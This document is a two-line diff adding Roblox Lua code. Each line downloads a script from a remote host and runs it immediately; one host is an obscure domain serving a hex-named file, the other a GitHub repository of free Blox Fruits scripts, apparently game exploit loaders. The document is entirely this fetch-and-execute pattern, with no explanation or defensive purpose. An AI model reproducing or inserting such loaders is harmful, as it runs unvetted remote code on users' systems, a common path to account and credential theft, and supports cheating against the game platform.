@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://egorikusa.space/4b57c15a3a7609b3cd069de6.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TrashLua/BloxFruits/main/FreeScripts.lua"))();
